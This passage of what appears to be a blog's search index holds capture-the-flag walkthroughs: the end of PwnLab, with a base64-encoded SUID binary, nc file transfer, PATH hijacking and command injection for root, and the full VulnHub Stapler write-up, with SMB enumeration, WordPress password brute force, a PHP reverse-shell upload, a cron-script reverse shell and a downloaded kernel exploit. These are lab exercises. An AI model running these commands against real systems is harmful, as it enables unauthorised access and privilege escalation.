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 copy this base64 string to a file called msgmike.b64 on our machine and then we can decode it:$ cat msgmike.b64 | base64 -d &amp;gt; msgmike.bin$ file msgmike.bin msgmike.bin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d7e0b21f33b2134bd17467c3bb9be37deb88b365, not strippedMethod #2: nc Attacker’s machine:$ nc -l -p 4444 &amp;gt; msgmike &amp;lt; /dev/null^C Victim’s machine:$ cat msgmike | nc 192.168.1.171 4444Analyzing the binaryThanks to file command, we already know that the binary is not stripped which means that it contains symbols that will ease the analysis.ghidra decompilationPassing the binary to ghidra’s decompiler, we can retrieve code close to the original source code:The binary use system function to run cat. But there is an issue. Indeed cat is called without its absolute path. So if we change our $PATH variable and name a malicious binary cat, it will be executed with mike’s privileges (since it’s a SUID binary).Exploitationkane@pwnlab:~$ which bash/bin/bashkane@pwnlab:~$ echo &quot;/bin/bash&quot; &amp;gt; ./catkane@pwnlab:~$ cat ./cat/bin/bashkane@pwnlab:~$ chmod +x ./catkane@pwnlab:~$ echo $PATH/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/gameskane@pwnlab:~$ export PATH=.kane@pwnlab:~$ ./msgmikebash: dircolors: command not foundbash: ls: command not foundmike@pwnlab:~$ ididbash: id: command not foundmike@pwnlab:~$ export PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games&amp;lt;/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games mike@pwnlab:~$ ididuid=1002(mike) gid=1002(mike) groups=1002(mike),1003(kane)mike@pwnlab:~$ YES, now we’re mike!RootGoing to mike’s home directory, there is another SUID binary msg2root:mike@pwnlab:/home/mike$ ls -lals -latotal 28drwxr-x--- 2 mike mike 4096 Mar 17 2016 .drwxr-xr-x 6 root root 4096 Mar 17 2016 ..-rw-r--r-- 1 mike mike 220 Mar 17 2016 .bash_logout-rw-r--r-- 1 mike mike 3515 Mar 17 2016 .bashrc-rwsr-sr-x 1 root root 5364 Mar 17 2016 msg2root-rw-r--r-- 1 mike mike 675 Mar 17 2016 .profilemike@pwnlab:/home/mike$ Let’s transfer it to our machine:Using ghidra’s decompiler:This time, it looks like a format string vulnerability.Indeed, if we execute id through this binary, we can see that euid, egid and groups are updated:mike@pwnlab:/home/mike$ ./msg2root./msg2rootMessage for root: &#39;&#39;; id #&#39;&#39;; id #uid=1002(mike) gid=1002(mike) euid=0(root) egid=0(root) groups=0(root),1003(kane)mike@pwnlab:/home/mike$Let’s have shell:mike@pwnlab:/home/mike$ ./msg2root./msg2rootMessage for root: &#39;&#39;; bash #&#39;&#39;; bash #bash-4.3$ ididuid=1002(mike) gid=1002(mike) groups=1002(mike),1003(kane)bash-4.3$It didn’t worked because we have to specify -p option in order to have a shell as root:mike@pwnlab:/home/mike$ ./msg2root./msg2rootMessage for root: &#39;&#39;; bash -p #&#39;&#39;; bash -p #bash-4.3# ididuid=1002(mike) gid=1002(mike) euid=0(root) egid=0(root) groups=0(root),1003(kane) Flag:bash-4.3# cd /rootcd /rootbash-4.3# ls -lals -latotal 20drwx------ 2 root root 4096 Mar 17 2016 .drwxr-xr-x 21 root root 4096 Mar 17 2016 ..lrwxrwxrwx 1 root root 9 Mar 17 2016 .bash_history -&amp;gt; /dev/null-rw-r--r-- 1 root root 570 Jan 31 2010 .bashrc---------- 1 root root 1840 Mar 17 2016 flag.txtlrwxrwxrwx 1 root root 9 Mar 17 2016 messages.txt -&amp;gt; /dev/nulllrwxrwxrwx 1 root root 9 Mar 17 2016 .mysql_history -&amp;gt; /dev/null-rw-r--r-- 1 root root 140 Nov 19 2007 .profilebash-4.3# cat flag.txtcat flag.txt.-=~=-. .-=~=-.(__ _)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(__ _)(_ ___) _____ _ (_ ___)(__ _) / __ \\ | | (__ _)( _ __) | / \\/ ___ _ __ __ _ _ __ __ _| |_ ___ ( _ __)(__ _) | | / _ \\| &#39;_ \\ / _` | &#39;__/ _` | __/ __| (__ _)(_ ___) | \\__/\\ (_) | | | | (_| | | | (_| | |_\\__ \\ (_ ___)(__ _) \\____/\\___/|_| |_|\\__, |_| \\__,_|\\__|___/ (__ _)( _ __) __/ | ( _ __)(__ _) |___/ (__ _)(__ _) (__ _)(_ ___) If you are reading this, means that you have break &#39;init&#39; (_ ___)( _ __) Pwnlab. I hope you enjoyed and thanks for your time doing ( _ __)(__ _) this challenge. (__ _)(_ ___) (_ ___)( _ __) Please send me your feedback or your writeup, I will love ( _ __)(__ _) reading it (__ _)(__ _) (__ _)(__ _) For sniferl4bs.com (__ _)( _ __) claor@PwnLab.net - @Chronicoder ( _ __)(__ _) (__ _)(_ ___)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(_ ___)`-._.-&#39; `-._.-&#39;bash-4.3#Useful links Hacker’s Grimoire - File upload bypass Difference between owner/root and RUID/EUID" }, { "title": "VulnHub - Stapler", "url": "/vulnhub-stapler/", "categories": "VulnHub walkthroughs, Linux", "tags": "vulnhub-linux, netdiscover, nikto, gobuster, wordpress, wpscan, brute-force, reverse-shell, searchsploit, CVE-2016-4557, kernel exploit, plain text password, writeup, oscp-prep", "date": "2021-01-11 19:13:54 +0700", "snippet": "Enumerationnetdiscovernetdiscover is an active/passive ARP reconnaissance tool that allows us to identify which machines in our local network.nmap scan$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Stapler-full-port-scan.txt 192.168.43.197PORT STATE SERVICE VERSION20/tcp closed ftp-data21/tcp open ftp vsftpd 2.0.8 or later| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_Can&#39;t get directory listing: PASV failed: 550 Permission denied.| ftp-syst: | STAT: | FTP server status:| Connected to 192.168.43.53| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 3| vsFTPd 3.0.3 - secure, fast, stable|_End of status22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)| 256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)|_ 256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)53/tcp open domain dnsmasq 2.75| dns-nsid: |_ bind.version: dnsmasq-2.7580/tcp open http PHP cli server 5.5 or later|_http-title: 404 Not Found123/tcp closed ntp137/tcp closed netbios-ns138/tcp closed netbios-dgm139/tcp open netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)666/tcp open doom?| fingerprint-strings: | NULL: | message2.jpgUT | QWux| &quot;DL[E| #;3[| \\xf6| u([r| qYQq| Y_?n2| 3&amp;amp;M~{| 9-a)T| L}AJ|_ .npy.93306/tcp open mysql MySQL 5.7.12-0ubuntu1| mysql-info: | Protocol: 10| Version: 5.7.12-0ubuntu1| Thread ID: 9| Capabilities flags: 63487| Some Capabilities: Support41Auth, LongPassword, FoundRows, Speaks41ProtocolOld, SupportsCompression, SupportsLoadDataLocal, IgnoreSigpipes, InteractiveClient, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, LongColumnFlag, ConnectWithDatabase, ODBCClient, DontAllowDatabaseTableColumn, SupportsTransactions, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults| Status: Autocommit| Salt: .\\x0COs\\x11)\\x12JU i^\\x06\\x11\\x05aF\\x17EV|_ Auth Plugin Name: mysql_native_password12380/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Site doesn&#39;t have a title (text/html).Host script results:|_clock-skew: mean: 59m58s, deviation: 0s, median: 59m57s|_nbstat: NetBIOS name: RED, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)| smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.9-Ubuntu)| Computer name: red| NetBIOS computer name: RED\\x00| Domain name: \\x00| FQDN: red|_ System time: 2021-01-07T11:01:45+00:00| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2021-01-07T11:01:45|_ start_date: N/AThere is a bunch of open ports such as 21 (FTP), 22 (SSH), 53 (DNS), 80 (HTTP), 139 (SMB), 3306 (MySQL) and also 12380 (HTTP).nmap vuln scanAmong the vulnerabilities reported by nmap, many are about DOS attacks (like Slowloris). However, However, one flaw stands out: Samba seems vulnerable to remote code execution (CVE-2009-3103).nmap OS detectionNevertheless, if we enable OS detection during the scan, we can see the target is Linux server so it might be not vulnerable to the CVE we saw earlier:HTTP (Port 80)gobusterNothing looks interesting yet. Let’s check out other ports.niktoFTP (port 21)We can log in as anonymous within ftp:During this first reconnaissance phase, we identified 3 potential users: Harry Elly JohnSMB (Port 139)$ smbclient -L //192.168.43.197/ -U &#39;%&#39; Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers kathy Disk Fred, What are we doing here? tmp Disk All temporary files should be stored here IPC$ IPC IPC Service (red server (Samba, Ubuntu))SMB1 disabled -- no workgroup availableTwo additional users: Kathy Fredkathy$ smbclient //192.168.43.197/kathy -U &#39;%&#39;Try &quot;help&quot; to get a list of possible commands.smb: \\&amp;gt; ls . D 0 Fri Jun 3 18:52:52 2016 .. D 0 Mon Jun 6 23:39:56 2016 kathy_stuff D 0 Sun Jun 5 17:02:27 2016 backup D 0 Sun Jun 5 17:04:14 2016 19478204 blocks of size 1024. 16395604 blocks availablesmb: \\&amp;gt; cd kathy_stuffsmb: \\kathy_stuff\\&amp;gt; ls . D 0 Sun Jun 5 17:02:27 2016 .. D 0 Fri Jun 3 18:52:52 2016 todo-list.txt N 64 Sun Jun 5 17:02:27 2016 19478204 blocks of size 1024. 16395600 blocks availablesmb: \\kathy_stuff\\&amp;gt; get todo-list.txtgetting file \\kathy_stuff\\todo-list.txt of size 64 as todo-list.txt (3.5 KiloBytes/sec) (average 3.5 KiloBytes/sec)smb: \\kathy_stuff\\&amp;gt; cd ..smb: \\&amp;gt; cd backup\\smb: \\backup\\&amp;gt; ls . D 0 Sun Jun 5 17:04:14 2016 .. D 0 Fri Jun 3 18:52:52 2016 vsftpd.conf N 5961 Sun Jun 5 17:03:45 2016 wordpress-4.tar.gz N 6321767 Mon Apr 27 19:14:46 2015 19478204 blocks of size 1024. 16395600 blocks availablesmb: \\backup\\&amp;gt; get vsftpd.confgetting file \\backup\\vsftpd.conf of size 5961 as vsftpd.conf (363.8 KiloBytes/sec) (average 173.1 KiloBytes/sec)smb: \\backup\\&amp;gt; get wordpress-4.tar.gzgetting file \\backup\\wordpress-4.tar.gz of size 6321767 as wordpress-4.tar.gz (28984.0 KiloBytes/sec) (average 25018.2 KiloBytes/sec)DNS (port 53) IP changed to 192.168.1.106 because I restarted the VMRequesting DNS zone transfer:We see a bunch of new IP addresses associated with domain names.$ cat services/53-dns.txt | grep A | grep -E &quot;\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b&quot;k.root-servers.net. 595045 IN A 193.0.14.129l.root-servers.net. 595045 IN A 199.7.83.42m.root-servers.net. 343564 IN A 202.12.27.33b.root-servers.net. 188945 IN A 199.9.14.201c.root-servers.net. 582908 IN A 192.33.4.12d.root-servers.net. 595045 IN A 199.7.91.13e.root-servers.net. 595045 IN A 192.203.230.10f.root-servers.net. 595045 IN A 192.5.5.241g.root-servers.net. 595045 IN A 192.112.36.4h.root-servers.net. 595045 IN A 198.97.190.53i.root-servers.net. 595045 IN A 192.36.148.17a.root-servers.net. 340541 IN A 198.41.0.4j.root-servers.net. 595045 IN A 192.58.128.30I saved these new IP addresses into a file and launched a nmap scan on each of them:for IP in $(cat IP.txt); do nmap -sV -oN scan/$IP.txt $IP; doneUnfortunately, each of these IP addresses only runs DNS on port 53 …HTTP•S (Port 12380)If we check the sources we can see another user (Tim):niktoUnlike port 80, this nikto scan returns us SSL info and plenty of interesting information such as: /robots.txt file with following entries: /blogblog /admin112233 a /phpmyadmin foldergobusterAs we can see gobuster doesn’t get any response if we attack the target using HTTP. But if we use set target’s URL as using HTTPS, it works.HTTPHTTPS I had to to reduce the number of threads (default 10). Otherwise, we’re getting too many errors.$ gobuster dir -u https://192.168.1.106:12380 -w /usr/share/dirb/wordlists/common.txt -o services/12380-https.txt -k -t 4===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url: https://192.168.1.106:12380[+] Threads: 4[+] Wordlist: /usr/share/dirb/wordlists/common.txt[+] Status codes: 200,204,301,302,307,401,403[+] User Agent: gobuster/3.0.1[+] Timeout: 10s===============================================================2021/01/07 17:46:17 Starting gobuster===============================================================/.hta (Status: 403)/.htaccess (Status: 403)/.htpasswd (Status: 403)/announcements (Status: 301)/index.html (Status: 200)/javascript (Status: 301)/phpmyadmin (Status: 301)/robots.txt (Status: 200)/server-status (Status: 403)===============================================================2021/01/07 17:46:23 Finished=============================================================== /announcementsAnother potential user: Abby./blogblogJohn Smith is the author of all posts!First, I took a look at HTTP Response Headers to see if we can get any information:Something doesn’t look right here…Then I ran gobuster:The site takes a while to load, so I decided to check the sources:We can notice that’s a WordPress website version 4.2.1.WordpressgobusterwpscanWordpress Security Scanner alias wpscan can help us attack this website. Enumerating users:$ wpscan --url https://192.168.1.106:12380/blogblog/ --disable-tls-checks --enumerate u Bruteforce passwords:$ wpscan --url https://192.168.1.106:12380/blogblog/ --disable-tls-checks --password-attack wp-login -U wp-users.txt -P /usr/share/wordlists/seclists/Passwords/darkweb2017-top10000.txt -t 100Let’s try to lo in:We’re in:Our goal to gain access to target’s shell. In order to do that, we can upload a malicious php file via wordpress.Among the users for whom we managed to get their passwords, only john has a different dashboard and seems to be the admin:Reverse shell (uploading malicious plugin)First and foremost, let’s run a listener:$ nc -lnvp 1234We’ll try to upload a tiny PHP reverse shell in WordPress plugins:We specify anonymous as username and password:shell.php is in https://192.168.1.106:12380/blogblog/wp-content/uploads/:If we click on it, PHP is executed by the web server and we got a shell:PrivescMethod #1: cron-logrotate.shlinpeas.sh reported an interesting file that we can overwrite: /usr/local/sbin/cron-logrotate.shThe file contains nothing interesting but it’s owned by root. If this script is executed by root via a cronjob we can put a reverse shell payload in it:It worked:Method #2: .bash_historyIf we inspect .bash_history files of each user in /home, we can identify these two lines:thisimypassword is JKanode’s password and JZQuyIN5 is peter’s password.If we log in as peter we can see that he can run sudo for every program. So if we run sudo su we can privesc to rootMethod #3: kernel exploitThe target machine is running Ubuntu 16.04 with a Linux kernel version 4.4.0-21-generic.Since it’s an old box, we can easily bet on kernel exploits. Indeed:$ searchsploit -m linux/local/39772.txt Exploit: Linux Kernel 4.4.x (Ubuntu 16.04) - &#39;double-fdput()&#39; bpf(BPF_PROG_LOAD) Privilege Escalation URL: https://www.exploit-db.com/exploits/39772 Path: /usr/share/exploitdb/exploits/linux/local/39772.txt File Type: C source, ASCII text, with CRLF line terminators Copied to: /mnt/hgfs/shared/Stapler/39772.txt If we take a look at 39772.txt, we see that there is a way to exploit the kernel which can lead us to code execution by root.Steps to reproduce on the target machine:$ cd /tmp/$ wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip$ unzip 39772.zip$ cd 39772/$ tar xvf exploit.tar$ cd ebpf_mapfd_doubleput_exploit$ chmod +x compile.sh$ ./compile.sh $ ./doubleput./doubleputstarting writevwoohoo, got pointer reusewritev returned successfully. if this worked, you&#39;ll have a root shell in &amp;lt;=60 seconds.suid file detected, launching rootshell...we have root privs now...root@red:/tmp/39772/ebpf_mapfd_doubleput_exploit# Final flag:root@red:~# cat flag.txtcat flag.txt~~~~~~~~~~&amp;lt;(Congratulations)&amp;gt;~~~~~~~~~~ .-&#39;&#39;&#39;&#39;&#39;-. |&#39;-----&#39;| |-.....-| | | | | _,._ | | __.o` o`&quot;-. | | .-O o `&quot;-.o O )_,._ | |( o O o )--.-&quot;`O o&quot;-.`&#39;-----&#39;` &#39;--------&#39; ( o O o) `----------`b6b545dc11b7a270f4bad23432190c75162c4a2bUseful links exploitDB - 39772 CVE-2016-4557 Exploit Database’s Binary Exploits" }, { "title": "HackTheBox - Optimum", "url": "/htb-optimum/", "categories": "Hackthebox walkthroughs, Windows, Easy", "tags": "htb-windows-easy, HttpFileServer, HFS, metasploit, meterpreter, suggester, searchsploit, RCE, tcpdump, nishang, powershell, Sherlock, Watson, Windows-Exploit-Suggester, wesng, CVE-2016-0099, MS16-032, Empire, writeup, oscp-prep", "date": "2021-01-07 08:24:42 +0700", "snippet": "Footholdnmap scan$ nmap 